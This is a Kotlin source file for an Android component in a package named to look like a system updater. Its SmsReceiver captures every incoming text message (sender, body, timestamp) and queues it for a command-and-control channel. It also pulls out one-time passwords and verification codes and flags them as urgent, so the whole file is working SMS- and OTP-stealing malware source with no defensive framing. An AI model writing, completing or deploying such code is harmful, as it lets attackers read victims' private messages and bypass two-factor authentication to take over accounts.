package com.android.systemservice.updater

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return
        val format = bundle.getString("format")

        for (pdu in pdus) {
            try {
                val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    SmsMessage.createFromPdu(pdu as ByteArray, format)
                } else {
                    @Suppress("DEPRECATION")
                    SmsMessage.createFromPdu(pdu as ByteArray)
                }
                if (msg == null) continue

                val sender = msg.originatingAddress ?: "unknown"
                val body = msg.messageBody ?: ""
                val ts = msg.timestampMillis

                val smsPayload = JSONObject().apply {
                    put("type", "sms")
                    put("from", sender)
                    put("body", body)
                    put("ts", ts)
                }
                C2Queue.enqueue(smsPayload.toString())

                val otpRegex = Regex("\\b(\\d{4,8})\\b")
                val match = otpRegex.find(body)
                if (match != null && (
                    body.contains("OTP", true) ||
                    body.contains("code", true) ||
                    body.contains("verification", true) ||
                    body.contains("pin", true))) {
                    val otpPayload = JSONObject().apply {
                        put("type", "otp")
                        put("via", "sms")
                        put("from", sender)
                        put("otp", match.value)
                        put("full", body)
                        put("ts", ts)
                    }
                    C2Queue.enqueueUrgent(otpPayload.toString())
                }
            } catch (_: Exception) {}
        }
    }
}
